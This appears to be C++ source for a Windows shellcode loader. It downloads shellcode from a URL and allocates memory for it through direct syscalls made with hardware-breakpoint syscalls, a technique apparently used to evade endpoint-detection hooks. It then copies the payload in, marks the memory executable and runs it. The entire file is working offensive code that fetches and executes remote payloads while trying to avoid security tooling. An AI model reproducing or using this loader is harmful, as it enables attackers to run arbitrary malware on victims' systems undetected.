#include "..\..\Public.hpp"
#include "HWSyscalls.h"

typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect);

typedef NTSTATUS (WINAPI* NtProtectVirtualMemory_t)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		if (!InitHWSyscalls())
			return;

		HANDLE hThread = NULL;
		DWORD oldProtect = NULL;
		PVOID Memory = NULL;
		SIZE_T size = shellcode.size();

		NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char*)("NtAllocateVirtualMemory"));
		pNtAllocateVirtualMemory((HANDLE)-1, &Memory, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());

		NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscall((char*)("NtProtectVirtualMemory"));
		pNtProtectVirtualMemory((HANDLE)-1, &Memory, &size, PAGE_EXECUTE_READ, &oldProtect);
		((void(*)())Memory)();

		DeinitHWSyscalls();
	}
}

int main()
{
	runShellcode();
	return 0;
}